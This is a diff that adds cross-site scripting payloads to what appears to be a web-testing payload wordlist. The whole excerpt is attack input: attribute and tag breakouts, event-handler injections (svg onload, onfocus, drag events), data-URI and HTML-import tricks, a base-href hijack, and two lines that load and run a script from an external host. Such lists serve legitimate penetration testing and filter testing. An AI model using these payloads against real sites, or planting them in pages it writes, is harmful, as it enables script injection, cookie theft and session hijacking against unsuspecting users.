@@ -8920,3 +8920,16 @@ alert(1)>
 ?pg=javascript:alert(1)",
 ?page=javascript:alert(1)"
 ?playerready=alert(document.cookie)
+"><script src=data:&comma;alert(1)//
+<script src="//brutelogic.com.br&sol;1.js&num; 
+"><script src=//brutelogic.com.br&sol;1.js&num; 
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+<base href=//0>
+<aside draggable="true" ondragenter="alert(1)">test</aside>
+<aside draggable="true" ondragleave="alert(1)">test</aside>
+<aside draggable="true" ondragstart="alert(1)">test</aside>
+<a href="#" onclick="alert('Safe attribute!')">Click me</a>
+"><svg onload=alert(1)//
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
